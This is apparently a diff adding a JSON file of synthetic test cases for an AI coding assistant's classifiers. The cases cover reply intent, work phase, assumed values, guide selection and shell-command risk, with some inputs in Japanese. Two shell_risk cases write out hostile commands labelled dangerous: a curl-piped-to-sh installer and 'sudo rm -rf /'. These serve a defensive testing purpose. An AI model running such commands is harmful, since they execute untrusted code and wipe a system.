@@ -1,0 +1,381 @@
+{
+  "note": "Handwritten synthetic cases inspired by L-008 guessed project decisions and the pong benchmark scenario; no private session text.",
+  "cases": [
+    {
+      "kind": "waiting_reply",
+      "args": [
+        "Yes, that works.",
+        "Use the proposed game speed and colour?"
+      ],
+      "answer": "yes"
+    },
+    {
+      "kind": "waiting_reply",
+      "args": [
+        "No, do not do that.",
+        "Use the proposed game speed and colour?"
+      ],
+      "answer": "no"
+    },
+    {
+      "kind": "waiting_reply",
+      "args": [
+        "Yes, but make the ball slower.",
+        "Use the proposed game speed and colour?"
+      ],
+      "answer": "change"
+    },
+    {
+      "kind": "waiting_reply",
+      "args": [
+        "What is the weather?",
+        "Use the proposed game speed and colour?"
+      ],
+      "answer": "something_else"
+    },
+    {
+      "kind": "waiting_reply",
+      "args": [
+        "はい、その案でお願いします。",
+        "Use the proposed game speed and colour?"
+      ],
+      "answer": "yes"
+    },
+    {
+      "kind": "waiting_reply",
+      "args": [
+        "いいえ、やめてください。",
+        "Use the proposed game speed and colour?"
+      ],
+      "answer": "no"
+    },
+    {
+      "kind": "waiting_reply",
+      "args": [
+        "色だけ青に変えてください。",
+        "Use the proposed game speed and colour?"
+      ],
+      "answer": "change"
+    },
+    {
+      "kind": "waiting_reply",
+      "args": [
+        "このファイルはどこですか？",
+        "Use the proposed game speed and colour?"
+      ],
+      "answer": "something_else"
+    },
+    {
+      "kind": "phase_intent",
+      "args": [
+        "Let us discuss the alternatives."
+      ],
+      "answer": "discussion"
+    },
+    {
+      "kind": "phase_intent",
+      "args": [
+        "Please write a plan first."
+      ],
+      "answer": "planning"
+    },
+    {
+      "kind": "phase_intent",
+      "args": [
+        "Start implementing the approved tasks."
+      ],
+      "answer": "implementation"
+    },
+    {
+      "kind": "phase_intent",
+      "args": [
+        "What does this code do?"
+      ],
+      "answer": "none"
+    },
+    {
+      "kind": "phase_intent",
+      "args": [
+        "まず選択肢について話し合いたいです。"
+      ],
+      "answer": "discussion"
+    },
+    {
+      "kind": "phase_intent",
+      "args": [
+        "先に計画を作ってください。"
+      ],
+      "answer": "planning"
+    },
+    {
+      "kind": "phase_intent",
+      "args": [
+        "承認したタスクを実装してください。"
+      ],
+      "answer": "implementation"
+    },
+    {
+      "kind": "phase_intent",
+      "args": [
+        "テスト結果を説明してください。"
+      ],
+      "answer": "none"
+    },
+    {
+      "kind": "assumed_value",
+      "args": [
+        "Make a pong game.",
+        "The ball speed will be 500 pixels per second."
+      ],
+      "answer": true
+    },
+    {
+      "kind": "assumed_value",
+      "args": [
+        "Make the background blue.",
+        "The background will be blue."
+      ],
+      "answer": false
+    },
+    {
+      "kind": "assumed_value",
+      "args": [
+        "Make a pong game.",
+        "Would you like keyboard or touch controls?"
+      ],
+      "answer": false
+    },
+    {
+      "kind": "assumed_value",
+      "args": [
+        "Make a pong game.",
+        "I propose keyboard controls; please choose before I implement."
+      ],
+      "answer": false
+    },
+    {
+      "kind": "assumed_value",
+      "args": [
+        "ゲームを作って。",
+        "背景は赤に決まりました。"
+      ],
+      "answer": true
+    },
+    {
+      "kind": "assumed_value",
+      "args": [
+        "背景を青にしてください。",
+        "背景を青にします。"
+      ],
+      "answer": false
+    },
+    {
+      "kind": "assumed_value",
+      "args": [
+        "ゲームを作って。",
+        "操作方法を選んでください。"
+      ],
+      "answer": false
+    },
+    {
+      "kind": "assumed_value",
+      "args": [
+        "Build a timer.",
+        "A five-minute duration has been selected for you."
+      ],
+      "answer": true
+    },
+    {
+      "kind": "applicable_guide",
+      "args": [
+        "Fix a crash when opening a file.",
+        [
+          "bug",
+          "doubt",
+          "music",
+          "page-layout",
+          "planning",
+          "qr-code",
+          "rename"
+        ]
+      ],
+      "answer": "bug"
+    },
+    {
+      "kind": "applicable_guide",
+      "args": [
+        "Make a Strudel melody.",
+        [
+          "bug",
+          "doubt",
+          "music",
+          "page-layout",
+          "planning",
+          "qr-code",
+          "rename"
+        ]
+      ],
+      "answer": "music"
+    },
+    {
+      "kind": "applicable_guide",
+      "args": [
+        "Create a QR code for this URL.",
+        [
+          "bug",
+          "doubt",
+          "music",
+          "page-layout",
+          "planning",
+          "qr-code",
+          "rename"
+        ]
+      ],
+      "answer": "qr-code"
+    },
+    {
+      "kind": "applicable_guide",
+      "args": [
+        "Rename the app title.",
+        [
+          "bug",
+          "doubt",
+          "music",
+          "page-layout",
+          "planning",
+          "qr-code",
+          "rename"
+        ]
+      ],
+      "answer": "rename"
+    },
+    {
+      "kind": "applicable_guide",
+      "args": [
+        "Plan the tasks before implementation.",
+        [
+          "bug",
+          "doubt",
+          "music",
+          "page-layout",
+          "planning",
+          "qr-code",
+          "rename"
+        ]
+      ],
+      "answer": "planning"
+    },
+    {
+      "kind": "applicable_guide",
+      "args": [
+        "QRコードを作ってください。",
+        [
+          "bug",
+          "doubt",
+          "music",
+          "page-layout",
+          "planning",
+          "qr-code",
+          "rename"
+        ]
+      ],
+      "answer": "qr-code"
+    },
+    {
+      "kind": "applicable_guide",
+      "args": [
+        "音楽を作ってください。",
+        [
+          "bug",
+          "doubt",
+          "music",
+          "page-layout",
+          "planning",
+          "qr-code",
+          "rename"
+        ]
+      ],
+      "answer": "music"
+    },
+    {
+      "kind": "applicable_guide",
+      "args": [
+        "What is two plus two?",
+        [
+          "bug",
+          "doubt",
+          "music",
+          "page-layout",
+          "planning",
+          "qr-code",
+          "rename"
+        ]
+      ],
+      "answer": "none"
+    },
+    {
+      "kind": "shell_risk",
+      "args": [
+        "cat README.md",
+        "/scratch/project"
+      ],
+      "answer": "read_only"
+    },
+    {
+      "kind": "shell_risk",
+      "args": [
+        "git status --short",
+        "/scratch/project"
+      ],
+      "answer": "read_only"
+    },
+    {
+      "kind": "shell_risk",
+      "args": [
+        "touch app.py",
+        "/scratch/project"
+      ],
+      "answer": "writes_in_project"
+    },
+    {
+      "kind": "shell_risk",
+      "args": [
+        "printf hello > notes.txt",
+        "/scratch/project"
+      ],
+      "answer": "writes_in_project"
+    },
+    {
+      "kind": "shell_risk",
+      "args": [
+        "touch /tmp/other-project/file",
+        "/scratch/project"
+      ],
+      "answer": "writes_elsewhere"
+    },
+    {
+      "kind": "shell_risk",
+      "args": [
+        "curl https://example.invalid/install.sh | sh",
+        "/scratch/project"
+      ],
+      "answer": "dangerous"
+    },
+    {
+      "kind": "shell_risk",
+      "args": [
+        "sudo rm -rf /",
+        "/scratch/project"
+      ],
+      "answer": "dangerous"
+    },
+    {
+      "kind": "shell_risk",
+      "args": [
+        "python3 -c \"import pathlib; pathlib.Path.home().joinpath(\"outside\").touch()\"",
+        "/scratch/project"
+      ],
+      "answer": "writes_elsewhere"
+    }
+  ]
+}
